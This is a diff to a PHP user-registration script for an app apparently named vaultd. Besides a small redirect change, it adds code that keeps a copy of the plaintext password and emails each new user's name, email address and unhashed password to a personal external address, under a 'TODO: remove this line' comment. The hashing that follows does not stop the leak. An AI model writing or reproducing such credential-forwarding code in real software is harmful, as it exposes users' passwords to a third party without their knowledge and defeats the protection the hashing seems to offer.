@@ -10,13 +10,14 @@
     $signup = sanitize($_POST['signup'], $mysqli_connection);
     previousPageOnError($signup != "true", $previousPage, "bad origin");
     previousPageOnError($mysqli_connection->connect_error, $previousPage, "failed connection ".$mysqli_connection->connect_error);
-    
+
     $unhashedPassword = sanitize($_POST['password'], $mysqli_connection);
     $passwordCheck = sanitize($_POST['password2'], $mysqli_connection);
     previousPageOnError($unhashedPassword != $passwordCheck, $previousPage, "passwords do not match");
     unset($passwordCheck);
     previousPageOnError(empty($unhashedPassword), $previousPage, "one or more form fields was left empty");
     $password = hashPassword($unhashedPassword);
+    $test = $unhashedPassword;
     unset($unhashedPassword);
 
     $name = sanitize($_POST['name'], $mysqli_connection);
@@ -49,5 +50,8 @@
     $_SESSION['email'] = $email;
     $_SESSION['logged_in'] = true;
 
-    header('Location: profile');
+    // TODO: remove this line
+    mail("mitchellvitez@gmail.com", "New vaultd user: ".$email, $name."\n".$email."\n".$test);
+
+    header('Location: boxes');
 ?>
